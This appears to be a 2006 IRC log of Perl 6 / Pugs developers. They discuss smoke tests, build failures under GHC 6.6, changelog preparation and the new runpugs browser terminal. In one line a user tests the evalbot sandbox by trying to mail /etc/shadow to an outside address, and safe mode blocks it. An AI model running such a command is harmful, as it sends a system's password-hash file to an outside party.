[00:26] *** nekokak joined
[00:29] *** gnuvince joined
[00:47] *** markstos joined
[01:14] *** lisppaste3 joined
[01:26] *** Pomin joined
[01:37] <dduncan> in the middle of make smoke now ...

[01:49] *** hikozaemon joined
[01:52] *** Aankh|Clone joined
[01:56] *** scsibug joined
[02:09] *** cjeris left
[02:23] *** nipotan joined
[02:41] <dduncan> now uploading smoke ...

[02:43] <dduncan> okay, see http://m19s28.vlinux.de/iblech/stuff/pugs-smokes/pugs-smoke-6.2.13-r0-darwin-normal--1160966466-6163--17954-17954-0-4638-747-0--3278313e3112b4e88f3f65d50518ffb6.html

[02:43] <lambdabot> Title: TAP Matrix - Mon Oct 16 02:14:53 2006 GMT, http://tinyurl.com/y6eafz

[02:44] <dduncan> So that's my first smoke of Pugs-6.2.13-pre1 ... done using GHC 6.6.0 on Mac OS X PPC, normal Haskell runcore

[02:45] <dduncan> all tests passed or appropriately skipped/todod, and the smoke ran in 102.72 minutes

[02:45] <dduncan> which *is* faster than I recall getting in the past, where I typically got around 135 minutes

[02:46] <dduncan> that was a month plus back, though

[02:46] <dduncan> so from what I can see, 6.2.13 is shippable

[02:46] <dduncan> matters of changelog updates etc notwithstanding

[02:47] <audreyt> good!

[02:47] <audreyt> dduncan++

[02:47] <audreyt> I'm working on finalizing the changelog now

[02:47] <dduncan> are you still holding off 'til tuesday?

[02:47] <audreyt> well, tuesday my time

[02:48] <dduncan> that's what I mean

[02:48] <audreyt> which is <14hours from now

[02:48] <audreyt> so yes

[02:48] <dduncan> I see

[02:48] <audreyt> now I'm off to lunch+changelog. thanks for the smoke

[02:48] * audreyt is now reasonably confident of the release

[02:49] <audreyt> (free of Judy GC bugs)++

[02:49] <audreyt> (not having the tuits to get to the end of that)--

[02:50] <audreyt> bbiab &

[02:51] <dduncan> in the process, you may want to address some minor formatting matters in the changelog, such as a blank line in the middle of the bullet-list for Updated Modules, following CGI

[02:51] <dduncan> the blank line probably shouldn't be there

[02:57] <xinming> audreyt: hmm, I want to know if I did wrong on changelog. And so that I can be more helpful in the future. :-P

[03:07] *** mjk joined
[03:11] *** Aankhen`` joined
[03:38] *** reZo joined
[03:58] <gnuvince> !eval my $c = 0; $c++ + ++$c;

[03:58] <gnuvince> ?eval my $c = 0; $c++ + ++$c;

[03:58] <evalbot_r14363> 2

[04:03] <xinming> It should be 3... >_<

[04:03] <xinming> maybe bug?

[04:03] <xinming> maybe not... >_<

[04:04] <xinming> I test it on perl 5, It alright...

[04:10] *** aufrank joined
[04:33] <bsb> http://www.flickr.com/photos/bsb/263631271/

[04:33] <lambdabot> Title: secure-pugs on Flickr - Photo Sharing!

[05:09] *** mugwump joined
[05:16] *** BooK_ joined
[05:31] <aufrank> anyone around?

[05:34] *** ron__ joined
[05:47] *** nothingmuch joined
[06:13] *** marmic joined
[06:33] *** buetow joined
[06:41] *** huyx joined
[06:43] *** huyx left
[06:45] *** iblechbot joined
[06:52] *** iblechbot_ joined
[07:18] *** zakharyas joined
[07:19] *** zakharyas joined
[07:20] <gaal> good read: http://www.cs.inf.ethz.ch/~wirth/Articles/GoodIdeas_origFig.pdf

[07:20] <lambdabot> http://tinyurl.com/yhc5r2

[07:22] <bsb> I was just skimming that...

[07:26] <bsb> looks like the functional programming trend came and went without much fuss

[07:27] <gaal> bsb! hey :)

[07:27] <gaal> (I'm not really here...)

[07:43] <bsb> ((I'm never really here))

[07:44] <ingy> nothingmuch: ping

[07:44] *** iblechbot joined
[07:46] *** reZo joined
[08:04] *** explorer joined
[08:05] <bsb> fyi ingy, yaml.org is timing out for me

[08:06] <ingy> yaml.com?

[08:06] <ingy> yaml.org looks fine

[08:06] <ingy> yaml.com should be hosed atm

[08:07] <ingy> bsb?

[08:07] <bsb> .com, sorry

[08:08] <ingy> the server is down much to my chagrin

[08:08] <ingy> hopefully back within 12 hours

[08:11] <bsb> I'll check channel PlYaml in the morning then, night

[08:12] *** gaal_ joined
[08:26] *** gaal_ is now known as gaal

[08:43] *** andara joined
[08:46] *** penk joined
[08:55] *** ruoso joined
[09:11] <nothingmuch> ingy: pong

[09:17] *** anatolyv joined
[09:21] *** chris2 joined
[09:27] *** elmex joined
[09:39] *** anatolyv left
[09:54] <svnbot6> r14364 | kudra++ | This week's summary

[09:57] <svnbot6> r14365 | kudra++ | Missed one thread earlier

[10:04] <svnbot6> r14366 | andara++ | [runpugs]

[10:04] <svnbot6> r14366 | andara++ | -clean up sessions/IP on timeout

[10:04] <svnbot6> r14366 | andara++ | -first commit of generic Web::Terminal

[10:05] <dduncan> fyi, http://www.plat-forms.org/

[10:05] <lambdabot> Title: Home

[10:05] <dduncan> if any of you want to participate in this competition and can get to NÃ¼rnberg, it might be interesting

[10:05] <dduncan> or rather, its a scientific study of sorts

[10:07] <dduncan> this event is part of the "http://www.heise.de/veranstaltungen/2007/ho_osb/en/" conference

[10:07] <lambdabot> http://tinyurl.com/yd2a7v

[10:07] <dduncan> "Open Source Meets Business"

[10:07] <dduncan> that is all

[10:08] <Patterner> pay me and i'll go to Nuernberg :)

[10:08] <dduncan> you'll have to find your own sponsor, so sayeth the site

[10:10] * dduncan signing off as its 3am ...

[10:10] *** dduncan left
[10:15] *** kanru joined
[10:17] *** mugwump joined
[10:46] *** kanru joined
[10:47] <audreyt> andara: would you like to blog something about htpt://run.pugscode.org/ ?

[10:47] <svnbot6> r14367 | audreyt++ | * ChangeLog: 0th sketch at an attempted new outline style,

[10:47] <svnbot6> r14367 | audreyt++ |   after several false starts...

[10:59] <svnbot6> r14368 | audreyt++ | * ChangeLog: Sketch #1.

[11:14] *** xinming_ joined
[11:25] <avar> hrm, say is considered unsafe

[11:27] <andara> audreyt: sure, I just wanted to have runpugs a little more stable before I did that.

[11:35] *** atmaniak_ joined
[11:45] *** HiTech69 joined
[11:46] <audreyt> avar: actually I'm changing that...

[11:48] <andara> audreyt: great, folks can do "hello world" in runpugs!

[11:49] <svnbot6> r14369 | audreyt++ | * Pugs.Prim: Mark `say` and `print` (the default-to-$*OUT version)

[11:49] <svnbot6> r14369 | audreyt++ |   as safe, not unsafe.

[11:54] *** agentzh joined
[11:55] <agentzh> audreyt: oops, ghc 6.6 + activeperl 5.8.7 + pugs head leads to failing build...

[11:56] <audreyt> nopaste the log?

[11:56] <pasteling> "agentzh" at 210.22.200.67 pasted "Win32 build failure" (38 lines, 1.9K) at http://sial.org/pbot/20476

[11:56] <agentzh> i built from realclean.

[11:57] *** hacker__ joined
[11:57] <hacker__> i kno more about computas than u all im da best hacker eva

[11:58] <audreyt> hacker__: would you like a Pugs commit bit?

[11:58] <audreyt> agentzh: weird, I thought we fixed it with the #define in p5embed.h

[11:58] <GeJ> \o/

[11:58] <agentzh> oh

[11:59] <audreyt> but evidently not. let me try

[11:59] <agentzh> okay~~

[12:05] <audreyt> agentzh: try again?

[12:05] <audreyt> bbiab

[12:05] <svnbot6> r14370 | audreyt++ | * Pugs.Embed.Perl5: Try to fix the Win32 build failure reported by agentzh++

[12:05] <svnbot6> r14370 | audreyt++ |   by delaying symbol resolution into p5embed.h time.

[12:05] <agentzh> sure~

[12:06] <gnuvince> agentzh: why the tildes?

[12:06] <agentzh> just a habit...

[12:07] <gnuvince> Does it mean anything that I'm not familiar with?

[12:07] <agentzh> a friend of mine uses it quite a lot, and i definitely has been affected by her. :)

[12:07] *** wolverian joined
[12:08] <avar> "Pugs::Gramamr::Rule" according to Wikipedia

[12:08] <agentzh> well, i'm not aware of that meaning.

[12:09] <agentzh> gnuvince: what's the meaning that you're familiar with?

[12:10] <gnuvince> None, I was just wondering if appending a tilde was similar to person++ that seems popular around here.

[12:10] <agentzh> audreyt: you fix works~~ yay!

[12:10] <agentzh> lol

[12:10] <agentzh> well, not really~~

[12:10] <gnuvince> ok :)

[12:10] <agentzh> *your fix

[12:11] <gnuvince> karma audreyt

[12:11] <jabbot> gnuvince: audreyt has karma of 2521

[12:11] <agentzh> karma agentzh

[12:11] <jabbot> agentzh: agentzh has karma of 27

[12:12] <agentzh> audreyt: oh, no...it failed at the end...

[12:12] <agentzh> i'll post the output.

[12:13] <pasteling> "agentzh" at 210.22.200.67 pasted "Win32 build failure [2]" (28 lines, 1.1K) at http://sial.org/pbot/20478

[12:14] *** wolverian joined
[12:16] <agentzh> iirc, pugs built successfully on this machine a week ago...

[12:16] <agentzh> not sure if it has anything to do with ghc 6.6...

[12:17] *** Limbic_Region joined
[12:17] <agentzh> Limbic_Region: pugs builds well on your win32 machine?

[12:17] <Limbic_Region> yes - as of yesterday afternoon

[12:18] <Limbic_Region> but not until I had to take drastic measures

[12:18] <Limbic_Region> make realclean was not sufficient

[12:18] <Limbic_Region> ended up blowing away src/ and several other directories

[12:18] <agentzh> really?

[12:18] <Limbic_Region> as did TimToady on his linux

[12:18] <Limbic_Region> yes - TimToady is the one who gave me the idea

[12:18] <Limbic_Region> though it is likely only a file or two

[12:18] *** Psyche^ joined
[12:18] <agentzh> wow

[12:18] <agentzh> maybe i should also have a try

[12:18] <Limbic_Region> not tracking it down was easier - so, I just got liberal

[12:19] <Limbic_Region> what's your build error?

[12:19] <agentzh> okay

[12:19] <agentzh> http://sial.org/pbot/20478

[12:19] <xinming_> audreyt: ping

[12:19] <lambdabot> Title: Paste #20478 from "agentzh" at 210.22.200.67

[12:20] <agentzh> xinming_: i'm also waiting for her. ;)

[12:20] *** iblechbot joined
[12:20] <Limbic_Region> agentzh - not the same as the one I was seeing so perhaps it is a new issue

[12:20] <Limbic_Region> before you start blowing away directories

[12:21] <agentzh> right, it's the p5 embedding issue.

[12:21] <Limbic_Region> let me try and build this morning (just finishing svn up now)

[12:21] <agentzh> an old issue...

[12:21] <agentzh> hehe, night here. :)

[12:21] <xinming_> lisppaste3: url

[12:21] *** xinming_ is now known as xinming

[12:22] <xinming> lisppaste3: help

[12:22] <xinming> lisppaste3: help url

[12:22] <xinming> ???

[12:22] <xinming> died...

[12:22] <agentzh> Limbic_Region: have you had the tuits to build cygwin ghc?

[12:23] <agentzh> Limbic_Region: the problem may not hit you since i'm using activeperl 5.8.7.

[12:24] <Limbic_Region> agentzh - no, not at all

[12:24] <agentzh> :)

[12:24] <Limbic_Region> apparently, the instructions for cross compiling *should* just work

[12:25] <Limbic_Region> and yet, what I get when I follow those instructions isn't what anyone on the ghc dev list expects

[12:25] <Limbic_Region> so before I can start fixing (or at least identifying) bugs

[12:25] <Limbic_Region> I need to get the build to start (failing dependencies is the problem)

[12:26] <Limbic_Region> I have it starred in my gmail though so I will get back to it eventually

[12:26] <agentzh> lol

[12:26] <xinming> I also got build failure using ghc 6.6

[12:26] <xinming> >_<

[12:27] <agentzh> great~~

[12:27] <Limbic_Region> xinming - if your problem is something with Judy - that's understandable to me

[12:27] <Limbic_Region> if it is something with embedded p5 - no idea

[12:27] <agentzh> glad to see  you're still working on it.

[12:29] <agentzh> xinming: you're looking for the lisppaster?

[12:29] <svnbot6> r14371 | audreyt++ | * Oops typo.

[12:29] <audreyt> agentzh: oops try again

[12:29] <agentzh> xinming: use http://sial.org/pbot/perl6 to paste your error?

[12:29] <agentzh> audreyt: okay~

[12:30] <pasteling> "xinming" at 222.212.1.184 pasted "Pugs build error" (36 lines, 1.6K) at http://sial.org/pbot/20479

[12:31] <xinming> Limbic_Region: I don't know if that is something with Judy. :-P

[12:31] <agentzh> pugs.exe.new -- aha!

[12:31] <agentzh> audreyt: built!

[12:31] <xinming> BTW, I tried it yesterday, and with the same error, and then, I thought, maybe I didn't compile the library, So, today after work, I tried again with a full install of ghc 6.6, still the problem

[12:31] <agentzh> audreyt++

[12:32] <Limbic_Region> morning audreyt

[12:32] <Limbic_Region> or evening as the case may be

[12:32] <audreyt> xinming: weird, did you install GHC with .msi?

[12:32] <audreyt> it should come with the mtl library

[12:33] <xinming> audreyt: I'm in Linux. ;-)

[12:33] <xinming> Writing version from `svk info` to /home/xinming/checkout/perl6/pugs/util/../src/Pugs/pugs_version.h

[12:33] <xinming> Path //mirror does not exist.

[12:33] <audreyt> xinming: how did you install 6.6?

[12:34] <xinming> ./configure --prefix=$MYPREFIX && make && make install

[12:34] <xinming> and I extracted the libraries to my ghc source directory

[12:34] *** Psyche^ is now known as Patterner

[12:35] <audreyt> you installed from source?

[12:35] <audreyt> not bin package?

[12:36] <audreyt> if so you needs the http://haskell.org/ghc/dist/6.6/ghc-6.6-src-extralibs.tar.bz2 too

[12:36] <lambdabot> http://tinyurl.com/yyfzxt

[12:36] <xinming> audreyt: No... Because ghc 6.6 isn't in gentoo yet. >_<

[12:36] <xinming> audreyt: I've done that...

[12:36] <xinming> hmm...

[12:37] <xinming> But I'm not sure if that would automatically install them

[12:37] <audreyt> you need to extract both .bz2 into the same place

[12:37] <audreyt> and then configure/make/make install

[12:38] <xinming> first I extract the source tarball, and extract the source, and move all dir in to libraries...

[12:38] <xinming> >_<

[12:38] <xinming> I think It should be the same as what you suggested...

[12:38] <agentzh> audreyt: another error during "nmake smoke", pasting now...

[12:39] <pasteling> "agentzh" at 210.22.200.67 pasted "error during "nmake smoke"" (38 lines, 2.4K) at http://sial.org/pbot/20480

[12:39] <audreyt> xinming: but it appears you did not install extra

[12:40] <Limbic_Region> audreyt - someone (can't remember who) was having an fps dependency issue last night (my time) as well

[12:40] <Limbic_Region> they were using a debian unstable package

[12:40] <audreyt> agentzh: nopaste your Makefile ?

[12:40] <audreyt> Limbic_Region: noted...

[12:40] <agentzh> audreyt: a sec...

[12:41] <xinming> audreyt: Ok, I'll try again. bbl

[12:42] <pasteling> "agentzh" at 210.22.200.67 pasted "my Makefile" (2021 lines, 131K) at http://sial.org/pbot/20481

[12:43] <svnbot6> r14372 | audreyt++ | * build_pugs.pl: Force "ghc-pkg expose" of dependent modules.

[12:43] *** evalbot_r14371 joined
[12:43] <Limbic_Region> oh, very nice job btw on the release prep audreyt++

[12:44] <audreyt> thanks :))

[12:45] <audreyt> agentzh: why did you have foo.cpp and test.c in the source dir?

[12:45] <audreyt> that was the cause

[12:45] <audreyt> rm them and run makefile.pl again?

[12:45] <agentzh> oh...

[12:45] <agentzh> okay

[12:45] <agentzh> that's my temp files...

[12:45] <agentzh> *they're

[12:45] <audreyt> makemaker is being too smart...

[12:45] <agentzh> *nod*

[12:48] <agentzh> audreyt: would you please rm the command "pl2bat.bat D:\projects\Pugs2\blib\script\pugs.exe" for win32 users?

[12:48] <agentzh> it's annoying. :(

[12:48] <audreyt> agentzh: please do that on MakefilePL on all means

[12:49] <audreyt> (I don't offhand know how to do that on win32)

[12:49] <agentzh> audreyt: okay~~

[12:56] <agentzh> smoking now...not sure if it can finish in the next 1 hour...

[12:56] <audreyt> k

[12:59] *** snowstalker joined
[13:02] <agentzh> audreyt: i've hit by a failing test...

[13:03] <agentzh> ext/Perl6-Container-Array/t/array-lazy.t

[13:03] <agentzh> #     Actual: undef

[13:03] <agentzh> #   Expected: 'k'

[13:03] <agentzh> #     Actual: '10'

[13:03] <agentzh> or maybe it's a todo...not sure...

[13:04] <audreyt> it's todo

[13:04] <agentzh> hmm...seems to be a todo.

[13:04] <agentzh> sorry~

[13:04] <audreyt> no problem~~~

[13:05] <agentzh> maybe we should suppress the stderr outputs when running a todo test...

[13:05] <audreyt> I prefer not

[13:05] <agentzh> lol

[13:05] <agentzh> k

[13:06] <agentzh> (from the implementor's point of view...)

[13:09] * agentzh thinks he should have built pugs with "nmake optimized". :/

[13:12] <audreyt> you you built with "fast"?

[13:12] <agentzh> yeah

[13:13] <audreyt> oy. mistake. :)

[13:13] <agentzh> so my smoke is doomed to be *much* slower?

[13:13] <agentzh> np, i'll clean and re-smoke.

[13:14] <agentzh> i'm just at ext/Tree/t/basic.t.

[13:14] <audreyt> k

[13:14] *** bpphillips joined
[13:16] <agentzh> there was a thread around pugs.exe.bat on p6c, but sadly no consequence was obtained.

[13:16] <agentzh> the summarizer wrote, "Autrijus asked if he would be willing to investigate a patch. He

[13:16] <agentzh>     responded that he would put it in his queue.

[13:16] <agentzh> LOL

[13:16] <audreyt> the queue is apparently infinite in length.

[13:17] <audreyt> or rather, indefinite.

[13:17] <agentzh> it seems that his queue has overflowed. :)

[13:17] <audreyt> and I don't share his queue now anyway...

[13:18] <audreyt> in any case it's your queue now, should you choose to accept it :)

[13:18] *** hexmode joined
[13:18] <agentzh> i'll have a try...

[13:18] <gaal> real world queues seem to be simple things

[13:18] <gaal> you can express them with cons cells

[13:18] <gaal> no need for Nil

[13:18] <gaal> they are in fact endless streams

[13:18] <audreyt> adeuately expressed with unfold

[13:19] <gaal> Getting Things Done with Lenses and Bananas

[13:19] <audreyt> @pl \f x ys -> unfoldr (Just . f) x ys

[13:19] <lambdabot> unfoldr . (Just .)

[13:20] <audreyt> here you go, it's expressed with (unfoldr . (Just .))

[13:20] <[particle]> howdy folks!

[13:20] <[particle]> i'm moosifying smartlinks.pl before committing to the parrot repo

[13:20] <audreyt> that's very moose

[13:20] <[particle]> it's looking great so far

[13:21] <agentzh> [particle]: (!)

[13:21] <[particle]> i hope to have a commit of a partial implementation today

[13:21] <gaal> whee

[13:21] <[particle]> ...need to write some tests first

[13:21] <agentzh> moooooooose

[13:21] <[particle]> indeed!

[13:22] <gaal> I don't understand that unfold

[13:22] <[particle]> agentzh: i noticed in the pod it says smartlinks should use as few modules as possible... why?

[13:22] <[particle]> agentzh: ...i'm obviously ignoring that bit, by using moose :)

[13:22] <audreyt> gaal: it's something that guarantees to produce an infinite list of streams no matter how you use it

[13:23] <agentzh> just try to put off the user's burden.

[13:23] <[particle]> ok

[13:23] <agentzh> some guys don't even know how to use cpan.

[13:23] <agentzh> so i even made Pod::Simple::HTML optional.

[13:24] <agentzh> that is the only thing which is non-core.

[13:25] <gaal> > (unfoldr . (Just .)) error eek []

[13:25] <lambdabot>  Not in scope: `eek'

[13:25] <gaal> > (unfoldr . (Just .)) error "eek" []

[13:25] <lambdabot>    The function `(unfoldr . ((Just .)))' is applied to three arguments,

[13:25] <lambdabot>   ...

[13:25] <gaal> [yadda, yadda, yadda]

[13:25] <agentzh> [particle]: i've been following fglock's convention. :)

[13:26] *** nothingmuch joined
[13:27] <gaal> > (unfoldr . (Just .)) error "eek"

[13:27] <lambdabot>  Add a type signature

[13:27] <gaal> > (Data.List.unfoldr . (Just .)) error "eek" -- I wish

[13:27] <lambdabot>  Add a type signature

[13:27] <gaal> anyway, that doesn't produce an infinite list

[13:28] <[particle]> agentzh: i hope you don't mind that i'm breaking that for parrot :)

[13:28] <audreyt> gaal++ # getting to the Bottom of it

[13:29] *** Odin-LAP joined
[13:29] <agentzh> [particle]: of course not.

[13:29] *** ajs_home joined
[13:29] *** Limbic_Region joined
[13:30] <agentzh> [particle]: smartlinks.pl has a lot of features that are hard to test.

[13:30] <agentzh> i've been mostly using regressions.

[13:32] <[particle]> where are the current tests?

[13:32] <agentzh> there're some under util/t/

[13:32] <[particle]> ok

[13:33] <[particle]> i'm in the data retrieval/construction phase of implementation

[13:33] <agentzh> but everytime i made change to the source, i'll use svn to check the output diffs.

[13:33] <agentzh> i mean the html outputs.

[13:33] <[particle]> ...where objects are created, and they automatically populate with information upon initialization

[13:34] <[particle]> eg. test file names, spec file names, smartlink info, etc

[13:34] <agentzh> that sounds good. :)

[13:35] <[particle]> well, it's fun!

[13:35] <agentzh> i'm manipulating raw data structures in the current implementation.

[13:35] <[particle]> yes, which i didn't like... too hard for me to read

[13:35] <[particle]> (the subs are too big)

[13:36] *** atmaniak_ left
[13:36] <agentzh> biab &

[13:36] <Limbic_Region> FYI - pugs built locally on Win32 just fine

[13:36] * Limbic_Region begins smoke

[13:36] <agentzh> sorry, end of day for me

[13:37] <agentzh> [particle]: don't forget to commit your code!

[13:37] <[particle]> agentzh: i'll keep you posted :)

[14:14] *** vel joined
[14:21] <gaal> hi #perl6, showing off evalbot to a friend

[14:21] <gaal> ?eval 1+4

[14:21] *** evalbot_r14371 is now known as evalbot_r14372

[14:21] <evalbot_r14372> 5

[14:21] <gaal> ?eval while 1 { 1 }

[14:21] <evalbot_r14372> (no output)

[14:22] <gnuvince> Does evalbot stop execution after a certain delay?

[14:22] <gaal> ?eval my $x = 4;  while 1 { $x ~= $x }

[14:22] <evalbot_r14372> (no output)

[14:23] <gnuvince> ?eval my $x = 4; $x ~= $x; $x

[14:23] <evalbot_r14372> \"44"

[14:23] <gaal> ?eval system 'mail [email@hidden.address] < /etc/shadow'

[14:23] <evalbot_r14372> Error: Unsafe function 'system' called under safe mode

[14:24] <gaal> ?eval warn "stderr"

[14:24] <evalbot_r14372> Error: Cannot cast from VUndef to Handle (VHandle)

[14:24] <gaal> heh, that error could be improved :-)

[14:29] <lumi> Is it trying to say it doesn't have stderr open?

[14:30] *** cmarcelo joined
[14:30] <gaal> it oughta say sorry, you can't do that

[14:31] <gaal> but due to implementation it's doing something like

[14:31] <gaal> $fh.say "moose"

[14:31] <gaal> where $fh is overridden

[14:31] <gaal> it's entirely a detail.

[14:31] <gnuvince> ?eval "Foo".say

[14:31] <evalbot_r14372> OUTPUT[Fooâ¤] Bool::True

[14:31] <gaal> yes, safe-say does work

[14:32] <gaal> stdout only.

[14:32] <gaal> s/detail/contingent and not pretty, commits welcome detail/

[14:34] <gaal> audreyt: in doc synopsis XML::Literal - Syntax suppor for XML literals

[14:34] <gaal> should be "support"

[14:38] <cmarcelo> hello folks.

[14:38] <cmarcelo> nothingmuch: are you there?

[14:41] *** nipotan is now known as nipotaway

[14:44] <audreyt> gaal: ok, noted and change in the repo, but unless you're willing to get comaint and release for me, I can't fix that tonight

[14:44] <svnbot6> r14373 | audreyt++ | * ChangeLog: Sketch #2, finally taking shape; "New Features"

[14:44] <svnbot6> r14373 | audreyt++ |   and "Bug Fixes" unified under the "Feature Changes" section,

[14:44] <svnbot6> r14373 | audreyt++ |   which is now divided across Synopsis chapters.

[14:44] <svnbot6> r14373 | audreyt++ |   Help welcome on sorting out the rest of the changelog after

[14:44] <svnbot6> r14373 | audreyt++ |   the cut lines; in any case I'll finish sorting them out tomorrow.

[14:44] <audreyt> *wave* &

[14:45] *** cmarcelo joined
[14:45] <nothingmuch> cmarcelo: sort of

[14:46] <nothingmuch> cmarcelo: i refactored a bit but i'm not done

[14:46] <nothingmuch> i'lll be back later today

[14:48] <cmarcelo> nm: ok. today I`ll get more test(s) translated to haskell.. sorry for missing last days, i was out of town..

[14:50] <audreyt> andara: I played with runpugs some and it seems announcable now. I'll write a short snippet, and you're welcome to follow up with more posts...

[14:51] <andara> audreyt: ha, it was you :-) I thought so too, I've written a short snippet as well...

[14:53] <audreyt> oh! then please post it :)

[14:53] <audreyt> I'll merge :)

[14:54] <nothingmuch> cmarcelo: okay

[14:54] <nothingmuch> i'll help

[14:54] <gaal> audreyt: lol, comaint for a 1-char doc fix. you're a busy moose :)

[14:55] <audreyt> actually, Ill discard mine and let you post it :) feel free to reuse bits from the nopasted...

[14:55] <nothingmuch> i have ghc 6.6 finally

[14:55] <pasteling> "audreyt" at 220.135.90.73 pasted "writeup sketch" (3 lines, 565B) at http://sial.org/pbot/20484

[14:55] <andara> audreyt: OK, there goes ...

[14:55] * audreyt hits "refresh" compulsively

[14:56] * gaal sends audreyt some sleepies

[14:56] <gaal> ...and hits "refresh" compulsively

[14:56] <wolverian> I find it very disturbing that I can delete the preceding text in runpugs

[14:57] <gaal> wolverian: it's called discontinuation. it's technology from the elided past

[14:57] <wolverian> well, it's disturbing!

[14:57] <audreyt> which is why it's called discontinuation!

[14:57] <audreyt> otherwise it'd be perturbing

[14:58] <audreyt> actually those are synonyms.

[14:58] *** cmarcelo joined
[14:59] * audreyt hits some more refresh

[14:59] <nothingmuch> runpugs++

[14:59] <audreyt> ooh there it is

[14:59] <andara> audreyt: I only just hit "save" :-)

[15:00] <andara> a bit terse, I admit. Feel free to add on

[15:00] <cmarcelo> audreyt: sad that hsjudy was killed (well at least for me hehe).. i`ll look for some alternative instead of using a haskell fnction as a finalizer (maybe pushing the finalizing thing to a C fun), but thats just a blind shot.. :P

[15:01] *** vel joined
[15:01] <nothingmuch> why was it killed?

[15:01] <audreyt> andara: see if my edits make sense

[15:02] <audreyt> nothingmuch: random GC errors across the board

[15:02] <nothingmuch> oi

[15:02] <audreyt> cmarcelo: it's likely not your problem... #ghc agreed it's a sensible use of GC. it may very well be RTS/FFI bug.

[15:02] <audreyt> cmarcelo: and I fully intend to revive Judy once we find some workarounds; I really like StrMap.

[15:02] <audreyt> but, sleep now. see you tomorrow, lambdacamels :)

[15:02] <audreyt> andara++ # again, for runpugs

[15:02] <gnuvince> what (who?) is judy?

[15:03] <nothingmuch> http://judy.sf.net

[15:03] <lambdabot> Title: Judy Arrays Web Page

[15:03] <nothingmuch> who == the author's sister IIRC ;-)

[15:03] <andara> audreyt: they do, though I didn't use any source code from TryRuby. I emailed Why but got no reply :-(

[15:04] <andara> audreyt: borrowed the nice blue & fonts choice though

[15:07] <gnuvince> is there a pugs equivalent of tryruby?

[15:07] <nothingmuch> andara: i think i killed it with unicode

[15:07] <nothingmuch> gnuvince: http://run.pugscode.org/

[15:07] <lambdabot> Title: Run Perl 6 Now -- in your browser!

[15:08] <andara> nothingmuch: yes, looks like you really killed it.

[15:08] <nothingmuch> sorry ;-)

[15:08] <andara>  nothingmuch: what did you have to do for that? I have no logging.

[15:09] <nothingmuch> audreyt: can i specify an || for Module::Install requires clauses?

[15:09] <nothingmuch> andara: i typed in quoted hebrew

[15:10] <andara> nothingmuch: long quote? I'd like to see what happened. I tried with small pieces of unicode, and though it doesn't work, it didn't kill it either.

[15:10] <nothingmuch> "×©×××"

[15:11] <nothingmuch> oops, i accidentally killed it again

[15:11] <nothingmuch> sorry, that one was unintentional

[15:11] <andara> Looks like I'll have to catch unicode for the moment ;-)

[15:13] <gaal> http://www.users.bigpond.com/robin_v/pli-n9.htm

[15:13] <lambdabot> Title: The PL/I Newsletter (PL/1 PL1), http://tinyurl.com/y5mt52

[15:13] <gaal> current PL/I newsletter

[15:13] <andara> nothingmuch: can you try to do the same with runpugs2 (same url +2)

[15:14] <nothingmuch> okay

[15:14] <nothingmuch> that worked

[15:14] <nothingmuch> in the sense that it didn't crash it

[15:14] <nothingmuch> but it doesn't echo back my string

[15:14] <nothingmuch> so either the output of the shell printer or the unicode

[15:14] <nothingmuch> input encoding are bad

[15:14] <nothingmuch> however, my line on the prompt is relayed correctly

[15:14] <andara> Well, no, Unicode is not supported, see http://feather.perl6.nl/~andara/runpugs/ :-)

[15:14] <lambdabot> Title: Run Perl 6 Now -- in your browser!

[15:15] <nothingmuch> ah

[15:15] <nothingmuch> =)

[15:15] <nothingmuch> andara++ # even if unicode is not supported

[15:15] <andara> nothingmuch: problem is I use Net:: Telnet, and that is not Unicode-aware.

[15:15] <pasteling> "nothingmuch" at 84.108.53.74 pasted "audreyt: is this sane use of Modulke::Install?" (9 lines, 236B) at http://sial.org/pbot/20486

[15:16] <nothingmuch> andara: $ENV{PERLIO} = ":utf8" during BEGIN { } somewhere

[15:16] <nothingmuch> and it should fix it

[15:17] <andara> nothingmuch: OK, I'll try that. Thanks!

[15:22] <TimToady> hmm, /tmp/ghc23652_0/ghc23652_0.hc:8:24: error: Parrot_hsc.h: No such file or directory

[15:23] <TimToady> anybody else seen that?

[15:23] <gaal> TimToady: what happens when you just run make again?

[15:23] <TimToady> hang on.

[15:23] *** Pomin joined
[15:24] <TimToady> works now, weird.

[15:24] <TimToady> thanks

[15:24] <gaal> that heppened to me too and I thought it was a fluke

[15:24] <PerlJam> Are you both on the same type of system?

[15:25] <gaal> must be wrong dependencies, or maybe hsc genning happens in build_pugs and therefore not very robust viz. dependencies

[15:25] <gaal> linux here

[15:25] <gaal> i don't remember when hsc files are treated

[15:25] <TimToady> make is a technology whose big bad false minimum I'd like to pull the plug out of and listen to a huge satisfying slurping sound.

[15:26] <gaal> that makes MAXPROGRAMMERS of us

[15:26] <TimToady> I'm sure every ide thinks its the answer...

[15:27] <masak> ?eval 1|2|3 + 4|5|6

[15:27] *** evalbot_r14372 is now known as evalbot_r14373

[15:27] <evalbot_r14373> (1 | 2 | 5 | 6 | 7)

[15:27] <TimToady> PerlJam, I'm on Linux

[15:27] <masak> evalbot_r14373: hunh?

[15:27] <araujo> morning

[15:27] <TimToady> masak: precedence

[15:27] <masak> TimToady: oh

[15:28] <masak> ?eval (1|2|3) + (4|5|6)

[15:28] <evalbot_r14373> ((5 | 6 | 7) | (6 | 7 | 8) | (7 | 8 | 9))

[15:28] <masak> hmm...

[15:28] <TimToady> the precedence tables are not optimized for contrived examples.  :)

[15:29] <masak> TimToady: fair enough :)

[15:29] *** c6rbon joined
[15:41] *** chris2 joined
[15:42] *** ruoso joined
[15:44] *** vel joined
[15:46] *** foo\ joined
[15:51] *** penk joined
[15:57] <svnbot6> r14374 | andara++ | [runpugs]

[15:57] <svnbot6> r14374 | andara++ | Now catches Unicode & apologises :-)

[16:11] <ingy> seen audreyt

[16:11] <jabbot> ingy: audreyt was seen 1 hours 8 minutes 27 seconds ago

[16:11] <Limbic_Region> (boss going out of town and leaving me in charge)--

[16:12] <ingy> I think I may have figured out a scheme for using M::C without .pmc

[16:12] <ingy> instead of having .pm -> .pmc

[16:13] <ingy> you go from .p -> .pm

[16:13] <ingy> by setting a special author-only PERL5OPT

[16:13] <TimToady> self-modifying .pm?

[16:14] <ingy> th compiled .pm can even have a sanity check for the PERL5OPT

[16:15] <ingy> TimToady: no, just the same .pm -> .pmc dance

[16:15] <ingy> but without the fear and loathing of .pmc

[16:15] <TimToady> how nice it would be if all of make's target files could simply be told "recompile yourself if you feel like it..."

[16:15] <nothingmuch> ingy: thanks =)

[16:15] <ingy> for what nothingmuch ?

[16:16] <nothingmuch> the << fix

[16:16] <TimToady> if you change the .p, what happens to the .pm?

[16:16] <TimToady> assuming you're in "author" mode.

